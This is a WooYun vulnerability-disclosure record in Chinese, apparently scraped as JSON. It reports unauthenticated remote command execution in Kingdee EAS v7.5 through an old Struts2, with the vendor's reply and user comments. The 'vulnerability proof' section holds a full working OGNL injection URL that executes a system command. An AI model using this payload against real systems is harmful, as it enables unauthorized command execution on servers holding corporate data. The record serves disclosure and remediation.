{"id": 8526, "wybug_id": "wooyun-2013-033331", "wybug_title": "金蝶EAS v7.5远程命令执行", "wybug_corp": "金蝶", "wybug_author": "missdiog", "wybug_date": "2013-08-02 17:17", "wybug_open_date": "2013-10-31 17:18", "wybug_type": "远程代码执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-31：\t细节向公众公开  简要描述： 金蝶 远程命令执行 详细说明：  金蝶EAS v7.5 全国使用的单位应该不少吧，而且涉及的内容应该是公司内核心机密吧。这个版本应该是最新的吧，应该是。。。吧。到服务器上查看struts2 发现为很老版本了2.1.8.1（我会告诉你服务器是捅下来的么）。\n\n该产品大部分链接需要登录才能访问，在没有帐号时相关权限只可远观而不可亵玩。buthttp://localhost/plt_iservice/service/findFavList.action 等几个action为接口，无须登录便可以访问。没有帐号也可以执行漏洞代码。   漏洞证明：  http://localhost/plt_iservice/service/findFavList.action?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'netstat%20-an\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))执行netstat -an\n\n   修复方案：  升级struts    版权声明：转载请注明来源 missdiog@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-08-03 11:31 厂商回复： 感谢测试，此版本非最新发布版本，新版本已更新！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-02 17:18 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  还是被你爆菊了。    \n     2013-08-02 17:22 |    \t\tmissdiog \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:5        | Hello world)\t\t \n  @mango 我是看不需要登录便可以爆菊才发出来的，不然没有意思    \n     2013-08-02 17:30 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @missdiog  - -碉堡了。    \n     2013-08-02 19:03 |    \t\tBlueheart \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 路人甲乙丙丁)\t\t \n  @missdiog 是金蝶客户端,还是？    \n     2013-08-02 22:26 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  是BS架构的那个？    \n     2013-08-03 12:30 |    \t\tmissdiog \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:5        | Hello world)\t\t \n  厂家不厚道啊，之前没有爆出来，是因为没有帐号不能利用，这个弱点可以在没有帐号的情况下利用。不是最新的？你们销售卖产品的时候都是卖旧版本给顾客？强烈抗议    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}